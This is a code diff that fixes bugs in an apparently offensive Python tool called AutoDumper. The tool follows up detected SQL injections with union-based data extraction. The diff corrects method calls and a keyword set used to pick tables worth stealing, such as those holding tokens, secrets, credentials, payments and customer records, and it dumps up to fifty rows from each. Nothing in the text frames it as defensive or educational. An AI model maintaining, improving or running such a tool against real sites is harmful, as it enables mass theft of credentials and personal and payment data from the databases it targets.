@@ -235,7 +235,7 @@ class AutoDumper:
                         url=url,
                         parameter=sqli_result.parameter,
                         session=session,
-                        hint_dbms=dbms,
+                        dbms_hint=dbms,
                         prefix=getattr(sqli_result, 'prefix', "'"),
                     )
                     if union_result and union_result.rows_extracted > 0:
@@ -777,7 +777,7 @@ class AutoDumper:
         INTERESTING_KEYWORDS = {
             'admin', 'config', 'setting', 'option', 'token', 'api',
             'key', 'secret', 'credential', 'auth', 'session', 'log',
-            'transaction' 'payment', 'order', 'invoice', 'billing',
+            'transaction', 'payment', 'order', 'invoice', 'billing',
             'customer', 'client', 'member', 'subscriber', 'account',
         }
         
@@ -800,8 +800,8 @@ class AutoDumper:
                     continue
                 
                 # Use existing dumper to extract rows from this table
-                rows = await self.dumper._extract_table_data(
-                    sqli_result, session, table, cols[:10], max_rows=50,
+                rows = await self.dumper.extract_data(
+                    sqli_result, table, cols[:10], session, limit=50,
                 )
                 if rows:
                     initial_dump.data[table] = rows
